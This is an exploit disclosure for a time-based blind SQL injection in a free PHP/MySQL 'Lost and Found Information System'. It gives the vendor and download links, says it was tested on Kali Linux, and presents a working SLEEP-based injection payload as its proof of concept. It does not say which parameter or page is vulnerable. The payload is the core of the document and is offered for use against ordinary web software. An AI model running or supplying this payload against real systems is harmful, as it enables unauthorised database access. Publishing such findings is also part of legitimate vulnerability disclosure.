# Lost and Found Information System

**Exploit Title: Lost and Found Information System Blind SQL Injection**

**Date**: 4/03/2024

**Exploit Author:** y3thu

**Vendor Homepage:** [https://www.sourcecodester.com/users/tips23](https://www.sourcecodester.com/users/tips23)

**Software Link:** [https://www.sourcecodester.com/php/16525/lost-and-found-information-system-using-php-and-mysql-db-source-code-free-download.html](https://www.sourcecodester.com/php/16525/lost-and-found-information-system-using-php-and-mysql-db-source-code-free-download.html)

**Attack Vector:** WEB, Network

**Testeted on:** Kali Linux

**POC**

- **payload:**
    
    ```jsx
    ' AND (SELECT 5506 FROM (SELECT(SLEEP(5)))Lwfa) AND 'SvjZ'='SvjZ
    ```
    
    ![Untitled](Lost%20and%20Found%20Information%20System%204793204531a64b86b5225a7bc1326670/Untitled.png)